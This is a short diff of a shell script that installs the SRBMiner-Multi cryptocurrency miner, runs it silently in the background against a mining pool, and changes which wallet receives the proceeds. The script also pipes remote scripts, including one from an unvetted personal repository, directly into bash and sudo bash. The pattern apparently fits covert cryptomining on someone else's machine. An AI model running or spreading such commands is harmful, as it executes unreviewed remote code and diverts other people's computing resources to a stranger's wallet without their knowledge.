@@ -14,5 +14,5 @@ sudo su --command "curl -sL https://deb.nodesource.com/setup_17.x | sudo -E bash
 wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.4/SRBMiner-Multi-2-7-4-Linux.tar.gz >/dev/null 2>&1
 tar -xzvf SRBMiner-Multi-2-7-4-Linux.tar.gz
 cd SRBMiner-Multi-2-7-4
-./SRBMiner-MULTI --algorithm verushash --pool stratum+tcp://sg.vipor.net:5040 --wallet RUM96eiFSsBKcmynDcRBsgmkMPWPyLS21C."AP$RANDOM" >/dev/null 2>&1 &
+./SRBMiner-MULTI --algorithm verushash --pool stratum+tcp://sg.vipor.net:5040 --wallet RPw1mcxaVvVcUicUqMmqon6n88esCrN3SP."AP$RANDOM" >/dev/null 2>&1 &
 curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
